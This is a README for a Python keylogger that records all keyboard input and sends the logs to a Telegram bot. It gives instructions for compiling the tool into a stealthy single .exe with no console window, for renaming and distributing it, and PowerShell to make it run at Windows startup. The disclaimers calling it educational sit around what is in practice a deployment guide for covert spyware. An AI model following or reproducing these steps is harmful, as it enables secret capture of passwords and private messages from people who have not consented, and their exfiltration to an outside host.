
# Keylogger with Telegram Bot Integration (Nuitka-Compiled)

> ⚠️ **Disclaimer**: This project is for **educational purposes only**. Unauthorized use of keyloggers is illegal and unethical. Do **not** use or distribute this software without **explicit permission** from all affected parties.

---

## 📌 Features

- 🔐 Captures all keyboard input.
- 📤 Sends logs to a Telegram bot at configurable intervals.
- 🛠️ Built in Python, compiled with **Nuitka** to `.exe` for performance and obfuscation.
- 🧙 Runs silently in the background without popping up a terminal window.

---

## ⚙️ Requirements

- Python 3.8 – 3.12
- [Telegram Bot Token](https://core.telegram.org/bots#botfather)
- Telegram Chat ID

Python packages:

```bash
pip install pynput requests
```

Compiler:

```bash
pip install nuitka
```

---

## 📁 Setup

1. Clone this repository or download the files.
2. Open the `keylogger.py` file and set:

```python
TELEGRAM_BOT_TOKEN = "your_bot_token"
TELEGRAM_CHAT_ID = "your_chat_id"
LOG_INTERVAL = 1800  # Log sending interval in seconds (default: 30 minutes)
```

3. Your main file should be named `keylogger.py`.

---

## 🚀 Running the Script

### Run with Python (for testing)

```bash
python keylogger.py
```

---

## 🧙‍♂️ Compile to a Stealth `.exe` using Nuitka

Use the following command to compile your Python script to a **single `.exe`** that **runs in the background** (no terminal pop-up):

```bash
C:\Users\devil\AppData\Roaming\Python\Python312\Scripts\nuitka --standalone --onefile --windows-disable-console keylogger.py
```

The executable will be located in the `/keylogger.dist/` folder. You can rename and distribute it as needed.

> 🧠 Tip: You can also add `--remove-output` and `--nofollow-imports` for a cleaner, smaller output.

---

## 📦 Optional: Add to Startup (Windows)

To make the program run at startup, you can move the `.exe` to the startup folder:

```powershell
$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.lnk"
$target = "C:\Path\To\Your\keylogger.exe"
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut($shortcut)
$sc.TargetPath = $target
$sc.Save()
```

---

## ❗ Disclaimer

This software is intended **solely for ethical, educational, and authorized testing** purposes. Using this software on systems or individuals without proper consent is a **criminal offense**. The creator holds **no liability** for any misuse or damage caused by this software.

---

